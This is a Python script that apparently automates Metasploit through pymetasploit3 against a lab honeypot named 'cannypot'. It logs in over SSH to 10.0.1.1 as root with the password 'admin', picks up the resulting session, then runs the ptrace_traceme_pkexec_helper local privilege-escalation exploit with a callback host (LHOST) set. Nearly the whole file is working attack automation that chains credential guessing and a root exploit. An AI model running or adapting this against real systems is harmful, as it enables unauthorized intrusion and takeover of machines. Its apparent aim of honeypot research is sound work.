# msf> load msgrpc Pass=test111

#[*] MSGRPC Service:  127.0.0.1:55552 
#[*] MSGRPC Username: msf
#[*] MSGRPC Password: T5X5iBLk
#[*] Successfully loaded plugin: msgrpc

from pymetasploit3.msfrpc import MsfRpcClient
import time

passwd = 'test111'
client = MsfRpcClient(passwd, port=55552)

# select exploit
cannypot = True

if cannypot:
    # Connecting to cannypot (cannypot1)
    print("###################### ssh login #######################")

    aux = client.modules.use('auxiliary', 'scanner/ssh/ssh_login')

    print(aux.description)
    print()
    print(aux.options)

    aux['RHOSTS'] = '10.0.1.1'
    aux['RPORT'] = '2222'
    aux['USERNAME'] = 'root'
    aux['VERBOSE'] = True
    aux['GatherProof'] = False
    aux['PASSWORD'] = 'admin'
    
    print("Missing options:", aux.missing_required)  # useful to check which mandatory option has not been set

    print("Execution of module", aux.execute())


# Get all sessions
# Find all available sessions
print("Sessions availables:", list(client.sessions.list))

# TODO how to clean all sessions before running ssh_login?

# Get a shell object
print("Get shell", list(client.sessions.list)[-1])

session_id = list(client.sessions.list)[-1]

#shell = client.sessions.session(session_id)

print('############# pkexec ##############')

exploit = client.modules.use('exploit', 'linux/local/ptrace_traceme_pkexec_helper')

print(exploit.description)
print()
print(exploit.options)

exploit['SESSION'] =  int(session_id)
exploit['RHOSTS'] = '10.0.1.1'
exploit['RPORT'] = '2222'
exploit['USERNAME'] = 'root'
exploit['PASSWORD'] = 'admin'
exploit['SSL'] = False 
exploit['LHOST'] = '10.0.0.10'
exploit['VERBOSE'] = True
exploit['AutoCheck'] = False

print("Missing options:", exploit.missing_required)
print("Execution of module", exploit.execute())
